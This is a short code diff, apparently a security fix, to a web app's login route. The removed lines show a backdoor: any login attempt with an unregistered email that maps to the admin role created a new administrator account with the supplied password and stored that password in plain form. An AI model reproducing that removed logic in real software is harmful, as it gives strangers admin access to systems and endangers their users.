@@ -61008,31 +61008,15 @@ authRouter.post("/login", (req, res) => {
     if (!email || !password) {
       return res.status(400).json({ error: "Email and password are required." });
     }
-    let user = db.findUserByEmail(email);
-    const targetRole = canonicalizeRole(email);
-    const isAdmin = targetRole === "admin";
+    const user = db.findUserByEmail(email);
     if (!user) {
-      if (isAdmin) {
-        const pass = hashPassword(password);
-        const created = db.createUser({
-          email: email.trim().toLowerCase(),
-          password,
-          displayName: "Tanvir Kabir Biplob (Administrator)",
-          role: "admin"
-        });
-        user = created.user;
-        user.passwordHash = pass.hash;
-        user.passwordSalt = pass.salt;
-        user.role = "admin";
-        db.save();
-      } else {
-        return res.status(401).json({ error: "Invalid email or password." });
-      }
+      return res.status(401).json({ error: "Invalid email or password." });
     }
     const isValid = verifyPassword(password, user.passwordHash, user.passwordSalt);
     if (!isValid) {
       return res.status(401).json({ error: "Invalid email or password." });
     }
+    const targetRole = canonicalizeRole(email);
     if (user.role !== targetRole) {
       user.role = targetRole;
       db.save();
